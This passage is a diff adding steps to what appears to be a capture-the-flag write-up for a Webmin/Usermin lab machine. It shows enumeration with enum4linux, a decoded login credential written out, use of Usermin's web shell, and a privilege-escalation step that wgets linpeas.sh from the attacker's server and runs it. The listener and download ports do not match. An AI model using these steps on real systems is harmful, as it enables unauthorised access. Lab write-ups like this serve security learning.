@@ -138,3 +138,49 @@ PORT      STATE SERVICE
 MAC Address: 00:0C:29:F0:13:C2 (VMware)
 ```
 The scan indicates that the system is vulnerable to File Disclosure vulnerability with the CVE: CVE-2006-3392
+-> Then I tried but unfortunately it is not affected by CVE-2006-3392
+Enumerate more in the page source of port 80 I found this interesting info
+<img width="1649" height="560" alt="Screenshot 2026-02-15 203919" src="https://github.com/user-attachments/assets/391bf88c-cdf7-4dac-8a1a-27fcd9f92f6d" />
+
+After deciphering the decrypted message I got this
+
+<img width="782" height="205" alt="Screenshot 2026-02-15 204246" src="https://github.com/user-attachments/assets/6e2c62c4-65f3-4915-8d9c-dc257cd5c363" />
+<img width="760" height="196" alt="Screenshot 2026-02-15 204133" src="https://github.com/user-attachments/assets/3c25c460-4adb-4720-800a-c48df6e31c44" />
+
+
+Then, I conducted another user enumeration for `139,445` 
+
+`enum4linux -aU <IP>`
+<img width="932" height="317" alt="Screenshot 2026-02-15 191937" src="https://github.com/user-attachments/assets/eeee099b-2ef4-4fb1-8fbb-db867570baf0" />
+
+
+-> try to login with the cred cyber:.2uqPEfj3D<P'a-3 
+=> worked on port 20000
+
+## Usermin Overview
+Usermin is a web-based interface for webmail, password changing, mail filters, fetchmail and much more
+
+Back to the target, after getting into port 20000
+I found that there is a command line interface in the `Login` menu option
+<img width="1917" height="623" alt="Screenshot 2026-02-16 001258" src="https://github.com/user-attachments/assets/aee076ea-1db0-449f-b2d5-21a8941ca8a7" />
+-> achieve the user flag
+
+# Privilege Escalation
+By setting up a listener on my attack machine
+```
+python3 -m http.server 1234
+```
+
+Then on target machine
+```
+wget http://<IP>:1324/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+
+
+
+
+
+
